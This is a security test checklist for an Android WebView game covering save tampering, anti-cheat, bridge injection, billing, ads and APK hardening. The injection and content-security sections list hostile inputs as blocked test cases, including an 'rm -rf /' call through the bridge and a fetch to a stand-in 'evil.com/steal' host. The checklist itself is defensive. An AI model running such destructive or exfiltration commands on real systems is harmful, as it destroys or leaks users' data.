# Security Test Checklist

## Save Data Security Tests

### Save Integrity
- [ ] Load valid save → Game loads correctly
- [ ] Modify save JSON (coins: 999999) → Save rejected, default used
- [ ] Modify save JSON (health: -10) → Save rejected
- [ ] Modify save JSON (unlockedLevels: [1,100]) → Save rejected
- [ ] Corrupt checksum → Save rejected
- [ ] Delete save file → New game starts with defaults
- [ ] Save version migration → Old saves upgraded correctly

### Value Bounds
- [ ] Coins > 999999 → Clamped to max
- [ ] Score > 99999999 → Clamped to max
- [ ] Health > 100 → Clamped to maxHealth
- [ ] Lives > 99 → Clamped to max
- [ ] Negative values → Clamped to 0

### Progression Integrity
- [ ] Level 50 unlocked without completing 49 → Detected and corrected
- [ ] Level 100 completed without boss defeat → Detected
- [ ] Achievement unlocked without meeting criteria → Not granted

## Anti-Cheat Tests

### Runtime Value Manipulation
- [ ] Memory editor: health set to 999 → Detected on next damage
- [ ] Memory editor: coins set to 999999 → Detected on next coin earn
- [ ] Memory editor: level set to 100 → Level select shows locked
- [ ] Speed hack: game runs 10x → Physics detects impossible movement

### Impossible Actions
- [ ] Complete level in < 1 second → Flagged as impossible
- [ ] Collect 1000 coins in one level → Flagged (max ~300)
- [ ] Defeat 50 enemies in level 1 → Flagged (max ~10)
- [ ] Zero damage on boss level → Allowed (skill), but logged
- [ ] Double jump in mid-air without powerup → Physics prevents

### Multi-Signal Detection
- [ ] Single anomaly (e.g., high score) → Warning logged
- [ ] Multiple anomalies (high score + impossible time + skipped levels) → Save flagged
- [ ] Flagged save → Scores not submitted, achievements not granted

## WebView Bridge Security Tests

### Exposed Methods
- [ ] `purchaseProduct()` → Validates product ID against allowlist
- [ ] `restorePurchases()` → Calls Play Billing restore
- [ ] `showInterstitialAd()` → Shows ad if loaded
- [ ] `showRewardedAd("revive")` → Only grants reward on completion callback
- [ ] `vibrate(1000000)` → Duration clamped
- [ ] `setKeepScreenOn(true)` → Sets flag
- [ ] `exitGame()` → Calls finish()

### Injection Attempts
- [ ] `AndroidBridge.arbitraryMethod()` → Undefined, no crash
- [ ] `AndroidBridge.exec("rm -rf /")` → Not exposed
- [ ] `AndroidBridge.startActivity(...)` → Not exposed
- [ ] `eval("AndroidBridge." + "malicious")` → No such method

### Content Security
- [ ] Load `https://evil.com` in WebView → Blocked (file:// only)
- [ ] `<iframe src="https://evil.com">` → Not in game HTML
- [ ] `window.location = "https://evil.com"` → No navigation
- [ ] `fetch("https://api.evil.com/steal")` → Network blocked by CSP

## Purchase Security Tests

### Google Play Billing Flow
- [ ] Valid purchase → Token verified → Item granted → Acknowledged
- [ ] Cancelled purchase → No item granted → Callback fired
- [ ] Pending purchase → No item granted → Callback when resolved
- [ ] Already owned (consumable) → Re-purchase allowed → Item granted
- [ ] Already owned (non-consumable) → "Already owned" → Restore flow
- [ ] Network loss during purchase → Queued → Processed on reconnect
- [ ] Duplicate callback → Deduplicated via purchase token

### Offline Behavior
- [ ] Purchase attempted offline → "Shop unavailable" shown
- [ ] No fake success → No item granted
- [ ] Queued purchases → Processed when online restored

### Restore Purchases
- [ ] Non-consumable owned → Restored → Equipped
- [ ] Consumable owned → Not restored (Play behavior)
- [ ] Subscription → Not applicable (no subscriptions)

## AdMob Security Tests

### Banner Ads
- [ ] Shown on Main Menu only
- [ ] Not shown during gameplay
- [ ] Not covering controls
- [ ] Test IDs in debug build

### Interstitial Ads
- [ ] Shown after level complete
- [ ] Not shown on launch
- [ ] Not shown during gameplay
- [ ] Frequency cap: max 1 per 2 minutes
- [ ] Load failure → No crash, gameplay continues

### Rewarded Ads
- [ ] Optional only (Revive, Checkpoint, Coins, Powerup)
- [ ] Reward granted ONLY on `onUserEarnedReward` callback
- [ ] Cancelled → No reward
- [ ] Failed to load → Option hidden/disabled
- [ ] No reward without ad completion

### Offline Ads
- [ ] No internet → Ads fail to load silently
- [ ] Gameplay continues normally
- [ ] No error screens
- [ ] No level blocking

## APK Security Tests

### Release Build
- [ ] `isDebuggable = false`
- [ ] `WebView.setWebContentsDebuggingEnabled(false)`
- [ ] ProGuard/R8 enabled
- [ ] No test IDs in resources
- [ ] No debug keystore signing
- [ ] `android:allowBackup=false` for sensitive data

### Tamper Detection
- [ ] Modified APK → Integrity check fails (if Play Integrity used)
- [ ] Repackaged APK → Signature verification fails
- [ ] Modified assets (levels, config) → Checksum mismatch

## Network Security Tests (Future)

### HTTPS Enforcement
- [ ] All requests use HTTPS
- [ ] Certificate pinning (if implemented)
- [ ] Cleartext traffic blocked

### API Security
- [ ] Requests signed
- [ ] Responses validated
- [ ] No secrets in client
- [ ] Rate limiting respected

## Privacy Tests

### Data Collection
- [ ] No personal data collected
- [ ] No analytics without consent
- [ ] No device ID tracking
- [ ] No location access
- [ ] No contacts access

### Data Storage
- [ ] Save data encrypted (if sensitive)
- [ ] No cloud sync without consent
- [ ] Clear data on uninstall

## Performance Security Tests

### Resource Exhaustion
- [ ] 10000 particles → Capped at 200
- [ ] Infinite projectile spawn → Capped at 50
- [ ] Recursive function → Stack overflow handled
- [ ] Large level (8000px) → Memory stable

### DoS Prevention
- [ ] Malformed save → Parsed safely
- [ ] Oversized JSON → Rejected
- [ ] Deep object nesting → Depth limited

## Automation
Run these tests via:
```bash
# Unit tests
./gradlew test

# Instrumented tests
./gradlew connectedAndroidTest

# Security lint
./gradlew lintSecurity

# Manual penetration testing
# Use drozer, Frida, objection for runtime analysis
```

## Sign-off
| Test Category | Pass/Fail | Notes | Date | Tester |
|--------------|-----------|-------|------|--------|
| Save Integrity | | | | |
| Anti-Cheat | | | | |
| WebView Bridge | | | | |
| Purchase Security | | | | |
| AdMob Security | | | | |
| APK Security | | | | |
| Network Security | | | | |
| Privacy | | | | |
| Performance | | | | |